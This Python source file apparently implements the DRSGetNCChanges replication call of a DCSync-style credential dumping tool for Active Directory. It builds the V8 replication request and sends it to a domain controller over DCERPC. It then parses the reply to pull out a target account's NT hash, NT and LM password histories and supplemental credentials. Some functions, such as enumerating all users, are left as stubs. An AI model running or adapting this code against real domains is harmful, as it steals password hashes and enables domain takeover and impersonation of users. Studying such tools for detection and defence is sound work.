import struct
from typing import Optional, List, Dict, Any, Generator
from rpc.ndr import NDRSerializer, NDRDeserializer
from rpc.dcerpc import DCERPCClient
from drsr.structures import DSNAME, PARTIAL_ATTR_VECTOR, ReplicationData
from config import (
    DRS_INIT_SYNC, DRS_WRIT_REP, DRS_NEVER_SYNCED, DRS_GET_ANC,
    EXOP_REPL_SECRETS, EXOP_REPL_OBJ, REPLICATION_ATTRIBUTES
)

DRSUAPI_DRS_GET_NC_CHANGES = 3


class DRSGetNCChanges:
    def __init__(self, rpc_client: DCERPCClient, drs_handle: bytes, ntds_dsa_guid: bytes = None):
        self.rpc = rpc_client
        self.drs_handle = drs_handle
        self.ntds_dsa_guid = ntds_dsa_guid or b"\x00" * 16
        
    def get_user_secrets(
        self,
        target_dn: str,
        domain_dn: str,
        target_guid: Optional[bytes] = None
    ) -> Optional[ReplicationData]:
        import os
        nc_dsname = DSNAME.from_dn(domain_dn)

        # For GetNCChanges, we need the GUID, not just the DN
        if target_guid:
            # Create DSNAME with GUID only (no string name)
            target_dsname = DSNAME(guid=target_guid, string_name="")
        else:
            # Fall back to DN-based DSNAME
            target_dsname = DSNAME.from_dn(target_dn)

        # Use EXOP_REPL_OBJ (6) for single object replication
        # Use V8 format like Impacket
        request = self._build_request_v8(
            nc_dsname=nc_dsname,
            target_dsname=target_dsname,
            extended_op=EXOP_REPL_OBJ
        )

        if os.environ.get('DEBUG_RPC'):
            print(f"[DEBUG] GetNCChanges request ({len(request)} bytes):")
            print(f"[DEBUG] Hex: {request.hex()}")

        response = self.rpc.call(DRSUAPI_DRS_GET_NC_CHANGES, request)

        return self._parse_response(response)
    
    def get_all_users(self, domain_dn: str) -> Generator[ReplicationData, None, None]:
        """Get all users with password secrets.

        This yields user data for each object with password secrets.
        Currently this is a placeholder - a full implementation would
        need to enumerate all users first via LDAP or CrackNames.
        """
        # For now, just return an empty generator
        # A full implementation would:
        # 1. Enumerate all user objects (via LDAP or by crawling the NC)
        # 2. For each user, call get_user_secrets_by_guid()
        return
        yield  # Make this a generator
    
    def _build_request_v5(
        self,
        nc_dsname: DSNAME,
        target_dsname: Optional[DSNAME] = None,
        usn_from: int = 0,
        extended_op: int = 0,
        max_objects: int = 1,
        max_bytes: int = 10 * 1024 * 1024
    ) -> bytes:
        """Build DRS_MSG_GETCHGREQ_V5 request (simpler structure)."""
        ndr = NDRSerializer()

        # hDrs (DRS_HANDLE = 20 bytes)
        ndr.pack_bytes(self.drs_handle)

        # dwInVersion = 5
        ndr.pack_uint32(5)

        # pmsgIn union tag = 5 (for V5)
        ndr.pack_uint32(5)

        # DRS_MSG_GETCHGREQ_V5 structure
        # uuidDsaObjDest (GUID - 16 bytes) - Use NtdsDsaObjectGuid
        ndr.pack_guid_raw(self.ntds_dsa_guid)

        # uuidInvocIdSrc (GUID - 16 bytes) - Use NtdsDsaObjectGuid
        ndr.pack_guid_raw(self.ntds_dsa_guid)

        # For single object replication (EXOP_REPL_OBJ or EXOP_REPL_SECRETS),
        # use the target object's DSNAME
        if target_dsname and extended_op in (EXOP_REPL_OBJ, EXOP_REPL_SECRETS):
            nc_data = target_dsname.to_ndr()
        else:
            nc_data = nc_dsname.to_ndr()

        # pNC is a [ref] pointer - has referent ID even when embedded
        ndr.pack_pointer(True)
        ndr.pack_bytes(nc_data)

        # Align to 4-byte boundary after variable-length DSNAME
        ndr.align(4)

        # Alignment for USN_VECTOR (contains LONGLONG which needs 8-byte alignment)
        ndr.align(8)

        # usnvecFrom (USN_VECTOR) - THREE LONGLONG fields (24 bytes total)
        # Per MS-DRSR: usnHighObjUpdate, usnReserved, usnHighPropUpdate
        ndr.pack_uint64(usn_from)  # usnHighObjUpdate
        ndr.pack_uint64(0)         # usnReserved
        ndr.pack_uint64(0)         # usnHighPropUpdate

        # pUpToDateVecDestV1 (PUPTODATE_VECTOR_V1_EXT) - [unique] pointer, NULL
        ndr.pack_pointer(False)

        # ulFlags (ULONG)
        flags = DRS_INIT_SYNC | DRS_WRIT_REP
        ndr.pack_uint32(flags)

        # cMaxObjects (ULONG)
        ndr.pack_uint32(max_objects)

        # cMaxBytes (ULONG) - Use 0 like Impacket
        ndr.pack_uint32(0)

        # ulExtendedOp (ULONG)
        ndr.pack_uint32(extended_op)

        # Alignment for liFsmoInfo (ULARGE_INTEGER needs 8-byte alignment)
        ndr.align(8)

        # liFsmoInfo (ULARGE_INTEGER = 8 bytes)
        ndr.pack_uint64(0)

        return ndr.get_data()

    def _build_request_v8(
        self,
        nc_dsname: DSNAME,
        target_dsname: Optional[DSNAME] = None,
        usn_from: int = 0,
        extended_op: int = 0,
        max_objects: int = 1,
        max_bytes: int = 10 * 1024 * 1024
    ) -> bytes:
        """Build DRS_MSG_GETCHGREQ_V8 request.

        NDR serialization rules for pointer referents:
        1. Pointer referent IDs are written inline with the structure
        2. Actual referent DATA is deferred to the end
        3. Alignment uses 0xAB padding bytes
        """
        ndr = NDRSerializer()

        # hDrs (DRS_HANDLE = 20 bytes)
        ndr.pack_bytes(self.drs_handle)

        # dwInVersion = 8
        ndr.pack_uint32(8)

        # pmsgIn union tag = 8 (for V8)
        ndr.pack_uint32(8)

        # Alignment padding before GUIDs (to 8-byte boundary)
        ndr.align(8, pad_byte=0xab)

        # DRS_MSG_GETCHGREQ_V8 structure
        # uuidDsaObjDest (GUID - 16 bytes) - Use NtdsDsaObjectGuid
        ndr.pack_guid_raw(self.ntds_dsa_guid)

        # uuidInvocIdSrc (GUID - 16 bytes) - Use NtdsDsaObjectGuid
        ndr.pack_guid_raw(self.ntds_dsa_guid)

        # pNC pointer referent ID (pointer only, data deferred)
        ndr.pack_pointer(True)

        # Alignment padding before USN_VECTOR
        ndr.align(8, pad_byte=0xab)

        # usnvecFrom (USN_VECTOR) - THREE LONGLONG fields (24 bytes total)
        ndr.pack_uint64(usn_from)  # usnHighObjUpdate
        ndr.pack_uint64(0)         # usnReserved
        ndr.pack_uint64(0)         # usnHighPropUpdate

        # pUpToDateVecDest (PUPTODATE_VECTOR_V1_EXT) - [unique] pointer, NULL
        ndr.pack_pointer(False)

        # ulFlags (ULONG)
        flags = DRS_INIT_SYNC | DRS_WRIT_REP
        ndr.pack_uint32(flags)

        # cMaxObjects (ULONG)
        ndr.pack_uint32(max_objects)

        # cMaxBytes (ULONG) - Use 0 like Impacket
        ndr.pack_uint32(0)

        # ulExtendedOp (ULONG)
        ndr.pack_uint32(extended_op)

        # Alignment for liFsmoInfo (ULARGE_INTEGER needs 8-byte alignment)
        ndr.align(8, pad_byte=0xab)

        # liFsmoInfo (ULARGE_INTEGER = 8 bytes)
        ndr.pack_uint64(0)

        # pPartialAttrSet (PPARTIAL_ATTR_VECTOR_V1_EXT) - NULL
        ndr.pack_pointer(False)

        # pPartialAttrSetEx (PPARTIAL_ATTR_VECTOR_V1_EXT) - NULL
        ndr.pack_pointer(False)

        # PrefixTableDest (SCHEMA_PREFIX_TABLE)
        # PrefixCount (DWORD) + pPrefixEntry (pointer)
        ndr.pack_uint32(0)         # PrefixCount = 0
        ndr.pack_pointer(False)    # pPrefixEntry = NULL

        # Now write deferred referent data (pNC points to DSNAME)
        # For single object replication, use the target object's DSNAME
        if target_dsname and extended_op in (EXOP_REPL_OBJ, EXOP_REPL_SECRETS):
            nc_data = target_dsname.to_ndr()
        else:
            nc_data = nc_dsname.to_ndr()
        ndr.pack_bytes(nc_data)

        return ndr.get_data()
    
    def _parse_response(self, response: bytes) -> Optional[ReplicationData]:
        import os
        ndr = NDRDeserializer(response)
        debug = os.environ.get('DEBUG_RPC')

        try:
            # pdwOutVersion
            version = ndr.unpack_uint32()
            # pmsgOut union tag (should match version)
            union_tag = ndr.unpack_uint32()

            if debug:
                print(f"[DEBUG] Parse: version={version}, union_tag={union_tag}")

            if version != 6 and version != 9:
                return None

            source_dsa_guid = ndr.unpack_bytes(16)
            source_dsa_invocation_id = ndr.unpack_bytes(16)

            nc_ptr = ndr.unpack_pointer()
            if debug:
                print(f"[DEBUG] Parse: nc_ptr={nc_ptr}, offset before align={ndr.offset}")

            # Align to 8 bytes for USN_VECTOR (contains LONGLONG)
            ndr.align(8)
            if debug:
                print(f"[DEBUG] Parse: offset after align={ndr.offset}")

            # V6 has usnvecFrom AND usnvecTo (each 24 bytes = 3 x 8)
            usn_from_obj = ndr.unpack_uint64()
            usn_from_res = ndr.unpack_uint64()
            usn_from_prop = ndr.unpack_uint64()
            usn_to_obj = ndr.unpack_uint64()
            usn_to_res = ndr.unpack_uint64()
            usn_to_prop = ndr.unpack_uint64()

            if debug:
                print(f"[DEBUG] Parse: usn_from_obj={usn_from_obj}, usn_to_obj={usn_to_obj}")

            # pUpToDateVecSrc pointer
            utd_ptr = ndr.unpack_pointer()
            if debug:
                print(f"[DEBUG] Parse: utd_ptr={utd_ptr}")

            # PrefixTableSrc (SCHEMA_PREFIX_TABLE)
            prefix_table_count = ndr.unpack_uint32()
            prefix_table_ptr = ndr.unpack_pointer()
            if debug:
                print(f"[DEBUG] Parse: prefix_table_count={prefix_table_count}, prefix_table_ptr={prefix_table_ptr}")

            # ulExtendedRet
            extended_ret = ndr.unpack_uint32()
            if debug:
                print(f"[DEBUG] Parse: extended_ret={extended_ret}")

            # cNumObjects
            object_count = ndr.unpack_uint32()
            if debug:
                print(f"[DEBUG] Parse: object_count={object_count}")

            # cNumBytes
            num_bytes = ndr.unpack_uint32()
            if debug:
                print(f"[DEBUG] Parse: num_bytes={num_bytes}")

            # pObjects
            first_obj_ptr = ndr.unpack_pointer()
            if debug:
                print(f"[DEBUG] Parse: first_obj_ptr={first_obj_ptr}")

            # fMoreData
            more_data = ndr.unpack_uint32()
            if debug:
                print(f"[DEBUG] Parse: more_data={more_data}")

            # cNumNcSizeObjects
            nc_size_obj = ndr.unpack_uint32()
            # cNumNcSizeValues
            nc_size_val = ndr.unpack_uint32()
            # cNumValues
            num_values = ndr.unpack_uint32()
            # rgValues pointer
            rg_values_ptr = ndr.unpack_pointer()
            # dwDRSError
            drs_error = ndr.unpack_uint32()

            if debug:
                print(f"[DEBUG] Parse: nc_size_obj={nc_size_obj}, nc_size_val={nc_size_val}")
                print(f"[DEBUG] Parse: num_values={num_values}, rg_values_ptr={rg_values_ptr}, drs_error={drs_error}")
                print(f"[DEBUG] Parse: current offset = {ndr.offset}")

            # Now read deferred pointer data in order:
            # 1. pNC (DSNAME)
            if nc_ptr:
                self._skip_dsname(ndr, debug)

            # 2. pUpToDateVecSrc (if present)
            if utd_ptr:
                self._skip_uptodatevec(ndr, debug)

            # 3. PrefixTableSrc entries (conformant array)
            if prefix_table_ptr and prefix_table_count > 0:
                self._skip_prefix_table(ndr, prefix_table_count, debug)

            if debug:
                print(f"[DEBUG] Parse: offset before pObjects = {ndr.offset}")

            result = None

            if first_obj_ptr and object_count > 0:
                result = self._parse_repl_entinflist(ndr, debug)

            return result

        except Exception as e:
            import os
            if os.environ.get('DEBUG_RPC'):
                import traceback
                print(f"[DEBUG] Parse error: {e}")
                traceback.print_exc()
            return None

    def _skip_dsname(self, ndr: NDRDeserializer, debug: bool = False):
        """Skip over a DSNAME structure in NDR format.

        DSNAME format (from MS-DRSR):
        - structLen (DWORD) - conformant array max_count
        - structLen (DWORD) - actual struct length
        - SidLen (DWORD)
        - Guid (16 bytes)
        - Sid (28 bytes - NT4SID fixed size)
        - NameLen (DWORD) - count of chars NOT including null
        - StringName (NameLen * 2 bytes) - UTF-16LE
        - Null terminator (2 bytes)
        """
        max_count = ndr.unpack_uint32()
        struct_len = ndr.unpack_uint32()
        sid_len = ndr.unpack_uint32()
        ndr.skip(16)  # GUID
        ndr.skip(28)  # NT4SID (fixed 28 bytes)
        name_len = ndr.unpack_uint32()
        if name_len > 0:
            ndr.skip(name_len * 2)  # UTF-16 string (NOT including null)
            ndr.skip(2)  # Null terminator
        ndr.align(4)
        if debug:
            print(f"[DEBUG] Skipped DSNAME: struct_len={struct_len}, name_len={name_len}")

    def _skip_uptodatevec(self, ndr: NDRDeserializer, debug: bool = False):
        """Skip UPTODATE_VECTOR_V2_EXT structure."""
        # dwVersion, dwReserved1, cNumCursors, dwReserved2
        version = ndr.unpack_uint32()
        reserved1 = ndr.unpack_uint32()
        num_cursors = ndr.unpack_uint32()
        reserved2 = ndr.unpack_uint32()
        # Array of UPTODATE_CURSOR_V2: uuidDsa (16) + usnHighPropUpdate (8) + timeLastSyncSuccess (8) = 32 each
        for _ in range(num_cursors):
            ndr.skip(32)
        if debug:
            print(f"[DEBUG] Skipped UPTODATE_VECTOR: {num_cursors} cursors")

    def _skip_prefix_table(self, ndr: NDRDeserializer, count: int, debug: bool = False):
        """Skip SCHEMA_PREFIX_TABLE entries.

        The pPrefixEntry points to a conformant array with format:
        - max_count (DWORD) - should match count parameter
        - array elements (SCHEMA_PREFIX_TABLE_ENTRY[])
        """
        actual_count = ndr.unpack_uint32()

        if debug:
            print(f"[DEBUG] PREFIX_TABLE: actual_count={actual_count}")

        # Read entry headers: ndx (DWORD) + length (DWORD) + blob_ptr (DWORD)
        entries = []
        for _ in range(actual_count):
            ndx = ndr.unpack_uint32()
            length = ndr.unpack_uint32()
            blob_ptr = ndr.unpack_pointer()
            entries.append((ndx, length, blob_ptr))
        # Read deferred blob data
        for ndx, length, blob_ptr in entries:
            if blob_ptr:
                blob_len = ndr.unpack_uint32()
                ndr.skip(blob_len)
                ndr.align(4)
        if debug:
            print(f"[DEBUG] Skipped PREFIX_TABLE: {actual_count} entries")

    def _parse_repl_entinflist(self, ndr: NDRDeserializer, debug: bool = False) -> ReplicationData:
        """Parse REPLENTINFLIST structure (linked list of replicated objects)."""
        result = ReplicationData()

        # REPLENTINFLIST structure:
        # - pNextEntInf: pointer to next entry
        # - Entinf: ENTINF embedded structure
        # - fIsNCPrefix: BOOL
        # - pParentGuid: GUID* pointer
        # - pMetaDataExt: PROPERTY_META_DATA_EXT_VECTOR* pointer

        next_ent_ptr = ndr.unpack_pointer()

        # ENTINF: pDsName (pointer) + ulFlags (DWORD) + AttrBlock (ATTR_BLOCK)
        dsname_ptr = ndr.unpack_pointer()
        ul_flags = ndr.unpack_uint32()

        # ATTR_BLOCK: attrCount (DWORD) + pAttr (pointer)
        attr_count = ndr.unpack_uint32()
        attr_ptr = ndr.unpack_pointer()

        # fIsNCPrefix (BOOL = DWORD)
        is_nc_prefix = ndr.unpack_uint32()

        # pParentGuid pointer
        parent_guid_ptr = ndr.unpack_pointer()

        # pMetaDataExt pointer
        meta_ext_ptr = ndr.unpack_pointer()

        if debug:
            print(f"[DEBUG] ENTINF: next_ptr={next_ent_ptr}, dsname_ptr={dsname_ptr}")
            print(f"[DEBUG] ENTINF: ul_flags={ul_flags}, attr_count={attr_count}, attr_ptr={attr_ptr}")
            print(f"[DEBUG] ENTINF: parent_guid_ptr={parent_guid_ptr}, meta_ext_ptr={meta_ext_ptr}")

        # Deferred data order (by pointer declaration order in structure):
        # 1. pDsName (DSNAME)
        # 2. pAttr (ATTR array)
        # 3. pParentGuid (GUID) - we skip this
        # 4. pMetaDataExt (PROPERTY_META_DATA_EXT_VECTOR) - we skip this

        # Read pDsName (DSNAME)
        if dsname_ptr:
            max_count = ndr.unpack_uint32()
            struct_len = ndr.unpack_uint32()
            sid_len = ndr.unpack_uint32()
            result.guid = ndr.unpack_bytes(16)
            nt4sid = ndr.unpack_bytes(28)
            if sid_len > 0 and sid_len <= 28:
                result.sid = nt4sid[:sid_len]
            name_len = ndr.unpack_uint32()
            if name_len > 0 and name_len < 10000:
                name_bytes = ndr.unpack_bytes(name_len * 2)
                ndr.skip(2)  # Skip null terminator
                try:
                    result.dn = name_bytes.decode("utf-16-le").rstrip("\x00")
                except UnicodeDecodeError:
                    result.dn = ""
            ndr.align(4)

            if debug:
                print(f"[DEBUG] Object GUID: {result.guid.hex()}")
                print(f"[DEBUG] Object SID: {result.sid.hex() if result.sid else '(none)'}")
                print(f"[DEBUG] Object DN: {result.dn}")

        # Read ATTR array (comes right after DSNAME in deferred data)
        if attr_ptr and attr_count > 0:
            self._parse_attr_block(ndr, result, attr_count, debug)

        # Skip pParentGuid and pMetaDataExt - we don't need them

        return result

    def _parse_attr_block(self, ndr: NDRDeserializer, result: ReplicationData, attr_count: int, debug: bool = False):
        """Parse ATTR_BLOCK containing replicated attributes."""
        # Conformant array: actual_count first
        actual_count = ndr.unpack_uint32()

        if debug:
            print(f"[DEBUG] ATTR_BLOCK: actual_count={actual_count}")

        # Read ATTR headers: attrTyp (DWORD) + AttrVal (ATTRVALBLOCK: valCount + pAVal)
        attrs = []
        for i in range(actual_count):
            attr_typ = ndr.unpack_uint32()
            val_count = ndr.unpack_uint32()
            val_ptr = ndr.unpack_pointer()
            attrs.append((attr_typ, val_count, val_ptr))
            if debug and i < 5:
                print(f"[DEBUG] Attr {i}: typ=0x{attr_typ:x}, val_count={val_count}, val_ptr={val_ptr}")

        # Read deferred ATTRVAL arrays
        for attr_typ, val_count, val_ptr in attrs:
            if val_ptr and val_count > 0:
                # ATTRVALBLOCK conformant array
                vals_actual_count = ndr.unpack_uint32()
                for j in range(vals_actual_count):
                    # ATTRVAL: valLen (DWORD) + pVal (pointer)
                    val_len = ndr.unpack_uint32()
                    pval_ptr = ndr.unpack_pointer()
                    if pval_ptr:
                        # Deferred value data: conformant byte array
                        data_len = ndr.unpack_uint32()
                        data = ndr.unpack_bytes(data_len)
                        ndr.align(4)

                        result.raw_attributes[attr_typ] = data
                        self._process_attribute(result, attr_typ, data)

                        if debug and attr_typ in (0x9005a, 0x9005e, 0x9005d, 0x9007d):
                            print(f"[DEBUG] Secret attr 0x{attr_typ:x}: len={data_len}")

    def _process_attribute(self, result: ReplicationData, attr_type: int, value: bytes):
        # Attribute types as returned by the server (OID prefix-encoded format)
        # These are (prefixIndex << 16) | lastOctet values
        ATTR_UNICODE_PWD = 0x9005a          # unicodePwd
        ATTR_NT_PWD_HISTORY = 0x9005e       # ntPwdHistory
        ATTR_LM_PWD_HISTORY = 0x9005d       # lmPwdHistory
        ATTR_SUPPLEMENTAL_CREDS = 0x9007d   # supplementalCredentials
        ATTR_OBJECT_SID = 0x90092           # objectSid
        ATTR_SAM_ACCOUNT_NAME = 0x90001     # sAMAccountName (corrected)
        ATTR_UPN = 0x900dd                  # userPrincipalName (0x900dd observed, but may vary)
        ATTR_UAC = 0x90008                  # userAccountControl
        ATTR_PWD_LAST_SET = 0x90060         # pwdLastSet (corrected from 0x9004a)
        ATTR_PRIMARY_GROUP_ID = 0x90096     # primaryGroupID (corrected from 0x90099)
        ATTR_SPN = 0x90303                  # servicePrincipalName
        
        if attr_type == ATTR_UNICODE_PWD:
            result.nt_hash = value
        elif attr_type == ATTR_NT_PWD_HISTORY:
            result.nt_history = [value[i:i+16] for i in range(0, len(value), 16)]
        elif attr_type == ATTR_LM_PWD_HISTORY:
            result.lm_history = [value[i:i+16] for i in range(0, len(value), 16)]
        elif attr_type == ATTR_SUPPLEMENTAL_CREDS:
            result.supplemental_credentials = value
        elif attr_type == ATTR_OBJECT_SID:
            result.sid = value
        elif attr_type == ATTR_SAM_ACCOUNT_NAME:
            try:
                result.sam_account_name = value.decode("utf-16-le").rstrip("\x00")
            except:
                pass
        elif attr_type == ATTR_UPN:
            try:
                result.user_principal_name = value.decode("utf-16-le").rstrip("\x00")
            except:
                pass
        elif attr_type == ATTR_UAC:
            if len(value) >= 4:
                result.user_account_control = struct.unpack("<I", value[:4])[0]
        elif attr_type == ATTR_PWD_LAST_SET:
            if len(value) >= 8:
                result.pwd_last_set = struct.unpack("<Q", value[:8])[0]
        elif attr_type == ATTR_PRIMARY_GROUP_ID:
            if len(value) >= 4:
                result.primary_group_id = struct.unpack("<I", value[:4])[0]
        elif attr_type == ATTR_SPN:
            try:
                result.service_principal_names.append(value.decode("utf-16-le").rstrip("\x00"))
            except:
                pass
    
    def _check_more_data(self, response: bytes) -> tuple:
        return False, 0

    def _get_more_data_flag(self, response: bytes) -> bool:
        """Extract fMoreData flag from response."""
        try:
            ndr = NDRDeserializer(response)

            # Skip to fMoreData field (offset varies based on response)
            version = ndr.unpack_uint32()
            union_tag = ndr.unpack_uint32()

            if version != 6 and version != 9:
                return False

            # Skip GUIDs
            ndr.skip(32)  # source_dsa_guid + source_dsa_invocation_id

            # Skip nc_ptr
            ndr.skip(4)

            # Align and skip USN vectors
            ndr.align(8)
            ndr.skip(48)  # 6 x LONGLONG

            # Skip pUpToDateVecSrc pointer
            ndr.skip(4)

            # Skip PrefixTableSrc
            ndr.skip(8)  # count + pointer

            # Skip ulExtendedRet, cNumObjects, cNumBytes, pObjects
            ndr.skip(16)

            # fMoreData
            more_data = ndr.unpack_uint32()
            return more_data != 0
        except:
            return False
